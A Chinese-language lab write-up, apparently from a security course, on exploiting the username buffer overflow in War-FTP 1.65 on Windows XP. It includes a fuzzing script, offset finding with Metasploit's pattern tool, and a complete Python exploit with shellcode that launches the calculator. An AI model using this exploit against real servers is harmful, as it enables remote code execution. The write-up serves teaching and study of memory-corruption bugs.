---
title: war-ftp1.65用户名缓冲区溢出 
date: 2019-04-23 23:24:58
---

## 运行环境
受害机：`Windows XP SP0`

攻击机：`Kali Linux`

## 软件及漏洞说明
War-ftp 是一个可以快速搭建ftp服务器的软件。

![](/images/warftp.jpeg)

查阅资料发现该软件的特定版本存在缓冲区溢出漏洞。

## 攻击原理
由于软件没有对输入的用户名进行边界检查，所以当我们输入的用户名过长，超过数组边界时，
数据将会溢出，并写入函数栈的高地址方向(即栈底方向)。甚至会覆盖函数的返回地址，从而
造成函数返回错误，如果我们精心设计了一段数据将函数返回地址覆盖为我们设计好的代码的
地址，那么函数在返回时便会返回到我们设计的代码，并开始执行我们设计的代码，而放弃原来
的未执行的代码。
因此，我们可以通过这种方式让ftp服务器执行一段我们精心设计好的恶意代码，当然，也可以
像本次攻击一样，只让它执行系统的计算器。

## 攻击方法和步骤

- 确定缓冲区长度
  
  - 我们首先编写python脚本（用来登录ftp服务器），输入不同长度的超长字符串，直到程序异常（说明服务器发生了缓冲区溢出）

    ```python
    #!/usr/bin/env python3
    # codeing:utf-8

    from ftplib import FTP
    import sys

    ftp = FTP()
    ftp.connect(sys.argv[1], int(sys.argv[2]))
    while True:
      evil = 'A'*int(input())
      ftp.login(evil, 'nosence')
    ```
    当输入长度为600时当前程序发生异常，即服务器发生缓冲区溢出

  - 采用工具软件来辅助确定缓冲区长度
    > /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600

    生成如下字符串

    > Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2A
    > c3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae
    > 6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9
    > Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2A
    > j3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al
    > 6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9
    > Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2A
    > q3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As
    > 6As7As8As9At0At1At2At3At4At5At6At7At8At9

    我们在受害机中打开调试软件`Imuunity Debugger`附加在`warftp`进程上进行调试

    在攻击机上以上述字符串作为用户名连接服务器，这时可以看到服务器已经在调试器中停止运行，记下此时的`EIP`值。

    ![](/images/debug.jpeg)
    
    再次使用辅助工具进行定位

    ![](/images/match.png)

    由此我们知道缓冲区长度为485,返回地址从486开始，并根据调试器中显示的从`ESP`的地址开始的字符的长度，我们也能推算出`ESP`的偏移为493
    
- 确定`PAYLOAD`的结构

  在本次攻击中并未采用课上所讲的`NSR`，`RNS`，`AR`等常用的`PAYLOAD`的结构。

  采用的是以`ESP`为中间跳板的`PAYLOAD`结构，即将返回地址填充为系统的动态链接库中的`JMP ESP`或`PUSH ESP`（本次攻击采用后者），RET命令所在的地址（函数在返回时，`EIP`指向动态链接库中，执行跳转指令再返回`ESP`执行我们填充在`ESP`后面的程序指令）

  故`PAYLOAD`的结构应该为
  > 485字节的字符——4字节的`JMP ESP`（或`PUSH ESP,RET`）指令——4字节的字符——`SHELLCODE`

- 按设计好的结构填充`PAYLOAD`
  由于对汇编不熟悉，所以本次攻击中使用的``SHELLCODE``都是在网上找的，而且由于
  因为系统的`JMP ESP`资料特别少，所以就编写程序寻找，但找到的地址不只允许系统调用，用户无法
  访问，所幸最后在网上找到了本系统对应的`PUSH ESP,RET`的地址。
  在网上找好对应系统的`SHELLCODE`和`JMP ESP`的字节码按上述结构填充即可。

  ```python
    jmpesp = '\x54\x1d\xab\x71'
    shellcode = (
            "\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
            "\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
            "\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
            "\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
            "\x57\x78\x01\xc2\x8b\x7a\x20\x01"
            "\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
            "\x45\x81\x3e\x43\x72\x65\x61\x75"
            "\xf2\x81\x7e\x08\x6f\x63\x65\x73"
            "\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
            "\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
            "\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
            "\xb1\xff\x53\xe2\xfd\x68\x63\x61"
            "\x6c\x63\x89\xe2\x52\x52\x53\x53"
            "\x53\x53\x53\x53\x52\x53\xff\xd7")
    PAYLOAD = '\x90'*485 + jmpesp + '\x90'*4 + shellcode
  ```
  

- 编写程序将我们的设计好的`PAYLOAD`发送给服务器

  ```python 
    #!/usr/bin/env python3
    # codeing:utf-8

    from ftplib import FTP
    import sys

    jmpesp = '\x54\x1d\xab\x71'
    shellcode = (
            "\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
            "\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
            "\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
            "\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
            "\x57\x78\x01\xc2\x8b\x7a\x20\x01"
            "\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
            "\x45\x81\x3e\x43\x72\x65\x61\x75"
            "\xf2\x81\x7e\x08\x6f\x63\x65\x73"
            "\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
            "\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
            "\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
            "\xb1\xff\x53\xe2\xfd\x68\x63\x61"
            "\x6c\x63\x89\xe2\x52\x52\x53\x53"
            "\x53\x53\x53\x53\x52\x53\xff\xd7")

    evil = '\x90'*485 + jmpesp + '\x90'*4 + shellcode

    ftp = FTP()
    ftp.connect(sys.argv[1], int(sys.argv[2]))
    ftp.login(evil, 'nosence')
    ftp.quit()
  ```

## 结果
  ![](/images/calc.jpeg)
